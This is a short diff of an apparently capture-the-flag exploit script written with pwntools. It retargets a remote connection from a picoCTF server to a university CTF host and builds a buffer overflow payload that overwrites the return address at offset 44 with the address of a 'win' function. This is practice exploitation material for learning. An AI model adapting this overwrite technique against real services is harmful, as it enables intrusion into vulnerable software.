@@ -2,7 +2,7 @@ from pwn import *
 
 exe = context.binary = ELF('vuln')
 winaddr = exe.symbols['win']
-io = remote('saturn.picoctf.net', 49278) #exe.process()
+io = remote('ctf.cs.fsu.edu', 17770) #exe.process()
 
 payload = fit({
     44: winaddr
